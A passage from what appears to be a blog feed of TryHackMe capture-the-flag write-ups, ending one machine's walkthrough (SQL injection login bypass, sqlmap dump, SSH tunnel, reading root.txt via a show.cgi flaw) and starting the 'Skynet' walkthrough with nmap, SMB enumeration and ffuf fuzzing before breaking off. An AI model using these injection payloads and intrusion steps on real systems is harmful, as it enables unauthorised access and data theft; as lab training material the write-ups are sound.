&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap &amp;lt;your_ip&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-28 10:50 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.108.222
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.060s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">997&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">259/tcp filtered esro-gen
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 9.93 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>First of all we access the web page and see the hitman,&lt;/p>
&lt;p>if you don’t know his name, just use google images.&lt;/p>
&lt;p>Then we see a login page, and try using SQLi&lt;/p>
&lt;p>We do this by adding &lt;code>' or 1=1 — -&lt;/code> instead of the username&lt;/p>
&lt;p>By doing this we can access the site.&lt;/p>
&lt;p>Now we are going to use sqlmap to dump the entire database!&lt;/p>
&lt;p>Before that we need to capture the request with burp.&lt;/p>
&lt;p>You can do that just by&lt;/p>
&lt;ul>
&lt;li>activating the proxy,&lt;/li>
&lt;li>capturing the request in the game zone portal&lt;/li>
&lt;li>copy it into a txt file,&lt;/li>
&lt;li>And put it into sqlmap like that:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sqlmap -r request.txt --dbms&lt;span class="o">=&lt;/span>mysql --dump --threads&lt;span class="o">=&lt;/span>&lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now that we have a username and password, I am going to use ssh.&lt;/p>
&lt;p>Then we will use a tool called &lt;strong>ss&lt;/strong> to investigate sockets running on a host.&lt;/p>
&lt;p>If we run &lt;strong>ss -tulpn&lt;/strong> it will tell us what socket connections are running&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Argument&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-t&lt;/td>
&lt;td>Display TCP sockets&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-u&lt;/td>
&lt;td>Display UDP sockets&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-l&lt;/td>
&lt;td>Displays only listening sockets&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-p&lt;/td>
&lt;td>Shows the process using the socket&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-n&lt;/td>
&lt;td>Doesn&amp;rsquo;t resolve service names&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>We see that is running a servvice on port 10000 but is filtered by the firewall.&lt;/p>
&lt;p>So we go back to our machine and run &lt;strong>&lt;code>ssh -L 10000:localhost:10000 &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt;&lt;/code>&lt;/strong>&lt;/p>
&lt;p>Once we are in we can open our browser and go to localhost:1000,&lt;/p>
&lt;p>here we are met with a login page.&lt;/p>
&lt;p>I just use the credential that we altready have and they worked.&lt;/p>
&lt;p>After that we just need to use metasploit, to search the exploit and run it using the options that he wants.&lt;/p>
&lt;p>I’ve tried for long enough to make it work but I didn’t succeded,&lt;/p>
&lt;p>in the end I searched in Exploit DB and read what the exploit does, I found out that it just allows you to exeute arbitrary commands in the &lt;code>/file/show.cgi&lt;/code> component&lt;/p>
&lt;p>Viewing the hint I know that the flag is in root.txt, so I just had to do this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">http://localhost:10000/file/show.cgi/root/root.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Skynet Writeup THM</title><link>https://simonefelici.github.io/p/skynet-writeup-thm/</link><pubDate>Thu, 28 Dec 2023 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/skynet-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png" alt="Featured image of post Skynet Writeup THM" />&lt;p>The first step is to do a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A &amp;lt;machine_ip&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-29 09:06 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.34.11
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.062s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">994&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.18 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.18 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Skynet
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">110/tcp open pop3 Dovecot pop3d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA SASL UIDL PIPELINING TOP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">143/tcp open imap Dovecot imapd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_imap-capabilities: SASL-IR more ENABLE LOGINDISABLEDA0001 OK IDLE post-login listed capabilities IMAP4rev1 have ID Pre-login LITERAL+ LOGIN-REFERRALS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that it has:&lt;/p>
&lt;ul>
&lt;li>SSH&lt;/li>
&lt;li>HTTP&lt;/li>
&lt;li>pop3&lt;/li>
&lt;li>netbios&lt;/li>
&lt;li>imap&lt;/li>
&lt;li>and samba open&lt;/li>
&lt;/ul>
&lt;p>The most interessing are ssh, http and samba.&lt;/p>
&lt;p>The first thing that I am going to do is, enumerate samba, as sugested by the room.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p &lt;span class="m">445&lt;/span> --script&lt;span class="o">=&lt;/span>smb-enum-shares.nse,smb-enum-users.nse &amp;lt;machine_ip&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-29 09:32 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.34.11
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.060s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-enum-shares:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> account_used: guest
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\I&lt;/span>PC$:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_IPC_HIDDEN
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: IPC Service &lt;span class="o">(&lt;/span>skynet server &lt;span class="o">(&lt;/span>Samba, Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\t&lt;/span>mp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: READ/WRITE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: READ/WRITE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\a&lt;/span>nonymous:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Skynet Anonymous Share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\s&lt;/span>rv&lt;span class="se">\s&lt;/span>amba
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: READ/WRITE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: READ/WRITE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\m&lt;/span>ilesdyson:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Miles Dyson Personal Share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\h&lt;/span>ome&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="se">\s&lt;/span>hare
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: &amp;lt;none&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.34.11&lt;span class="se">\p&lt;/span>rint$:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Printer Drivers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Users: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max Users: &amp;lt;unlimited&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Path: C:&lt;span class="se">\v&lt;/span>ar&lt;span class="se">\l&lt;/span>ib&lt;span class="se">\s&lt;/span>amba&lt;span class="se">\p&lt;/span>rinters
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Current user access: &amp;lt;none&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-enum-users:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> SKYNET&lt;span class="se">\m&lt;/span>ilesdyson &lt;span class="o">(&lt;/span>RID: 1000&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Full name:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Description:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Flags: Normal user account
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 13.61 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see it has Anonymous open: \10.10.34.11\anonymous:&lt;/p>
&lt;p>So I am going to enter in that folder.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. D &lt;span class="m">0&lt;/span> Thu Nov &lt;span class="m">26&lt;/span> 11:04:00 &lt;span class="m">2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.. D &lt;span class="m">0&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 03:20:17 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">attention.txt N &lt;span class="m">163&lt;/span> Tue Sep &lt;span class="m">17&lt;/span> 23:04:59 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">logs D &lt;span class="m">0&lt;/span> Wed Sep &lt;span class="m">18&lt;/span> 00:42:16 &lt;span class="m">2019&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Inside that folder we find one file and a directory, I am just going to download them.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat attention.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-Miles Dyson
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So, here we see Miles Dyson again, that tells everyone to change the passwords.&lt;/p>
&lt;p>In the first log file instead we get a list of passwords, the newer is the one that we are searching for.&lt;/p>
&lt;p>The other two are empty, but maybe there are other two accounts.&lt;/p>
&lt;p>Now that we have an username and password I tried to connect to the smb share of Miles, but it didn’t go weel:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient //10.10.34.11/milesdyson -U milesdyson
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>WORKGROUP&lt;span class="se">\m&lt;/span>ilesdyson&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">session setup failed: NT_STATUS_LOGON_FAILURE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I just went to the next phase, the web page.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>From the web page we only get this thing, but we could do a directory fuzzing for more results.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.34.11/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
